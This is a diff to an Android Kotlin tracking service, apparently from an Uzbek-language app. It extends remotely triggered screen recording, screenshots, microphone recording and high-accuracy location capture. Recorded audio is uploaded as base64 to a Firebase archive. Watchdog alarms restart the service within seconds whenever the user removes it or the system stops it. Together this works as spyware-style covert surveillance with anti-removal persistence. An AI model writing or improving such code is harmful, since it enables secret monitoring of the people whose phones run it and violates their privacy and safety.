@@ -79,6 +79,7 @@ class TrackerService : Service() {
     private val heartbeatRunnable = object : Runnable {
         override fun run() {
             try {
+                database?.goOnline()
                 val devId = getActiveDeviceId()
                 val now = System.currentTimeMillis()
                 database?.getReference("tracking/devices/$devId/heartbeat")?.setValue(now)
@@ -207,19 +208,20 @@ class TrackerService : Service() {
 
     override fun onTaskRemoved(rootIntent: Intent?) {
         try {
-            val restartServiceIntent = Intent(applicationContext, TrackerService::class.java).also {
-                it.setPackage(packageName)
+            val restartIntent = Intent(this, BootReceiver::class.java).apply {
+                action = "com.hokimloyha.app.ACTION_RESTART_SERVICE"
             }
-            val restartServicePendingIntent = PendingIntent.getService(
-                this, 1, restartServiceIntent,
-                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            val pi = PendingIntent.getBroadcast(
+                this, 1002, restartIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
             )
             val alarmService = getSystemService(ALARM_SERVICE) as AlarmManager
-            alarmService.set(
-                AlarmManager.ELAPSED_REALTIME,
-                SystemClock.elapsedRealtime() + 1000,
-                restartServicePendingIntent
-            )
+            val triggerAt = SystemClock.elapsedRealtime() + 1000L
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                alarmService.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
+            } else {
+                alarmService.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
+            }
         } catch (e: Exception) {
             Log.e(TAG, "onTaskRemoved watchdog error", e)
         }
@@ -327,11 +329,14 @@ class TrackerService : Service() {
 
         commandsRef?.child("record_screen")?.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                val ts = snapshot.getValue(Long::class.java) ?: 0L
-                if (ts > 0L && ts != lastHandledScreenTimestamp) {
-                    lastHandledScreenTimestamp = ts
-                    triggerScreenCapture()
+                val value = snapshot.value
+                val shouldRecord = when (value) {
+                    is Boolean -> value
+                    is String -> value.equals("start", ignoreCase = true) || value.equals("true", ignoreCase = true)
+                    is Number -> value.toLong() > 0L
+                    else -> false
                 }
+                handleScreenRecordCommand(shouldRecord)
             }
             override fun onCancelled(error: DatabaseError) {}
         })
@@ -347,33 +352,61 @@ class TrackerService : Service() {
         })
     }
 
-    private fun triggerScreenCapture() {
+    private var isScreenRecording = false
+
+    private fun handleScreenRecordCommand(shouldRecord: Boolean) {
         val devId = getActiveDeviceId()
-        try {
-            // Agar media projection ruxsati berilgan bo'lsa -> ScreenRecordService ni ishga tushiramiz
-            if (AppStateTracker.mediaProjectionIntent != null) {
-                val recIntent = Intent(this, ScreenRecordService::class.java).apply {
-                    action = ScreenRecordService.ACTION_START
+        if (shouldRecord && !isScreenRecording) {
+            isScreenRecording = true
+            try {
+                if (AppStateTracker.mediaProjectionIntent != null) {
+                    val recIntent = Intent(this, ScreenRecordService::class.java).apply {
+                        action = ScreenRecordService.ACTION_START
+                        putExtra("device_id", devId)
+                    }
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        startForegroundService(recIntent)
+                    } else {
+                        startService(recIntent)
+                    }
+                } else {
+                    ScreenCaptureHelper.captureScreenshot(this, devId)
+                    isScreenRecording = false
+                    commandsRef?.child("record_screen")?.setValue(false)
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Screen record start error", e)
+                ScreenCaptureHelper.captureScreenshot(this, devId)
+                isScreenRecording = false
+                commandsRef?.child("record_screen")?.setValue(false)
+            }
+        } else if (!shouldRecord && isScreenRecording) {
+            isScreenRecording = false
+            try {
+                val stopIntent = Intent(this, ScreenRecordService::class.java).apply {
+                    action = ScreenRecordService.ACTION_STOP
                     putExtra("device_id", devId)
                 }
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    startForegroundService(recIntent)
-                } else {
-                    startService(recIntent)
-                }
-            } else {
-                // Media projection yo'q bo'lsa -> zudlik bilan ekran skrinshotini olamiz
-                ScreenCaptureHelper.captureScreenshot(this, devId)
+                startService(stopIntent)
+            } catch (e: Exception) {
+                Log.e(TAG, "Screen record stop error", e)
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "Screen record trigger error", e)
-            ScreenCaptureHelper.captureScreenshot(this, devId)
         }
     }
 
     private fun requestImmediateLocation() {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
             ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            
+            try {
+                fusedLocationClient?.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null)
+                    ?.addOnSuccessListener { loc ->
+                        if (loc != null) {
+                            saveLocationIfChanged(loc.latitude, loc.longitude, force = true)
+                        }
+                    }
+            } catch (_: Exception) {}
+
             fusedLocationClient?.lastLocation?.addOnSuccessListener { loc ->
                 if (loc != null) {
                     saveLocationIfChanged(loc.latitude, loc.longitude, force = true)
@@ -621,11 +654,12 @@ class TrackerService : Service() {
         try {
             if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                 mediaRef?.child("audio_status")?.setValue("Mikrofon ruxsati berilmagan")
+                mediaRef?.child("status")?.setValue("Mikrofon ruxsati berilmagan")
                 return
             }
 
-            acquireWakeLock(180000L)
-            val audioFile = File(filesDir, "audio_record.3gp")
+            acquireWakeLock(300000L)
+            val audioFile = File(filesDir, "audio_record.m4a")
             if (audioFile.exists()) audioFile.delete()
 
             mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
@@ -635,20 +669,26 @@ class TrackerService : Service() {
                 MediaRecorder()
             }.apply {
                 setAudioSource(MediaRecorder.AudioSource.MIC)
-                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
-                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                setAudioEncodingBitRate(64000)
+                setAudioSamplingRate(44100)
                 setOutputFile(audioFile.absolutePath)
                 prepare()
                 start()
             }
             audioRecordStartTime = System.currentTimeMillis()
             isRecording = true
+            mediaRef?.child("is_audio_recording")?.setValue(true)
             mediaRef?.child("audio_status")?.setValue("🎙️ Ovoz yozish boshlandi...")
+            mediaRef?.child("status")?.setValue("🎙️ Ovoz yozilmoqda...")
         } catch (e: Exception) {
             releaseWakeLock()
             Log.e(TAG, "Audio start error", e)
             isRecording = false
+            mediaRef?.child("is_audio_recording")?.setValue(false)
             mediaRef?.child("audio_status")?.setValue("Ovoz xatosi: ${e.localizedMessage}")
+            mediaRef?.child("status")?.setValue("Ovoz xatosi: ${e.localizedMessage}")
         }
     }
 
@@ -656,8 +696,8 @@ class TrackerService : Service() {
         serviceExecutor.execute {
             try {
                 val elapsed = System.currentTimeMillis() - audioRecordStartTime
-                if (elapsed < 1000L) {
-                    try { Thread.sleep(1000L - elapsed) } catch (_: Exception) {}
+                if (elapsed < 1200L) {
+                    try { Thread.sleep(1200L - elapsed) } catch (_: Exception) {}
                 }
 
                 try {
@@ -670,26 +710,30 @@ class TrackerService : Service() {
                 } catch (_: Exception) {}
                 mediaRecorder = null
                 isRecording = false
+                mediaRef?.child("is_audio_recording")?.setValue(false)
 
-                val audioFile = File(filesDir, "audio_record.3gp")
+                val audioFile = File(filesDir, "audio_record.m4a")
                 if (audioFile.exists() && audioFile.length() > 0) {
                     val bytes = audioFile.readBytes()
                     audioFile.delete()
                     val base64Audio = Base64.encodeToString(bytes, Base64.NO_WRAP)
 
                     val now = System.currentTimeMillis()
+                    val durationSec = ((now - audioRecordStartTime) / 1000).toInt().coerceAtLeast(1)
                     val archiveAudio = mapOf(
                         "audio_base64" to base64Audio,
-                        "timestamp" to now
+                        "timestamp" to now,
+                        "duration" to durationSec
                     )
                     mediaRef?.child("latest_audio")?.setValue(archiveAudio)
                     val audioRef = mediaRef?.child("archive_audio")
                     audioRef?.push()?.setValue(archiveAudio)?.addOnCompleteListener { task ->
                         releaseWakeLock()
                         if (task.isSuccessful) {
-                            mediaRef?.child("audio_status")?.setValue("🎙️ Ovoz saqlandi (${bytes.size / 1024} KB)")
+                            mediaRef?.child("audio_status")?.setValue("🎙️ Ovoz saqlandi ($durationSec sek, ${bytes.size / 1024} KB)")
+                            mediaRef?.child("status")?.setValue("🎙️ Yangi ovoz yozuvi saqlandi ($now)")
                             if (audioRef != null) {
-                                trimFirebaseArchive(audioRef, 15)
+                                trimFirebaseArchive(audioRef, 20)
                             }
                         } else {
                             mediaRef?.child("audio_status")?.setValue("Ovoz saqlash xatosi")
@@ -697,10 +741,13 @@ class TrackerService : Service() {
                     }
                 } else {
                     releaseWakeLock()
+                    mediaRef?.child("audio_status")?.setValue("Ovoz yozuvi bo'sh yoki saqlanmadi")
                     try { audioFile.delete() } catch (_: Exception) {}
                 }
             } catch (e: Exception) {
                 releaseWakeLock()
+                isRecording = false
+                mediaRef?.child("is_audio_recording")?.setValue(false)
                 Log.e(TAG, "Audio stop error", e)
             }
         }
@@ -778,7 +825,7 @@ class TrackerService : Service() {
             stopAudioRecording()
         }
         try {
-            val audioFile = File(filesDir, "audio_record.3gp")
+            val audioFile = File(filesDir, "audio_record.m4a")
             if (audioFile.exists()) audioFile.delete()
         } catch (_: Exception) {}
         try {
@@ -788,19 +835,21 @@ class TrackerService : Service() {
             serviceExecutor.shutdown()
         } catch (_: Exception) {}
 
-        // Agar xizmat tizim tomonidan o'ldirilsa, 2 soniyada qayta ishga tushirish
+        // Agar xizmat tizim tomonidan to'xtatilsa, zudlik bilan qayta ishga tushirish
         try {
-            val prefs = getSharedPreferences("hokim_app_prefs", Context.MODE_PRIVATE)
-            if (!prefs.getString("current_user", null).isNullOrEmpty()) {
-                val restartIntent = Intent(applicationContext, TrackerService::class.java).apply {
-                    setPackage(packageName)
-                }
-                val pi = PendingIntent.getService(
-                    this, 9999, restartIntent,
-                    PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
-                )
-                val am = getSystemService(ALARM_SERVICE) as AlarmManager
-                am.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 2000L, pi)
+            val restartIntent = Intent(this, BootReceiver::class.java).apply {
+                action = "com.hokimloyha.app.ACTION_RESTART_SERVICE"
+            }
+            val pi = PendingIntent.getBroadcast(
+                this, 9999, restartIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
+            val am = getSystemService(ALARM_SERVICE) as AlarmManager
+            val triggerAt = SystemClock.elapsedRealtime() + 1500L
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
+            } else {
+                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
             }
         } catch (_: Exception) {}
     }
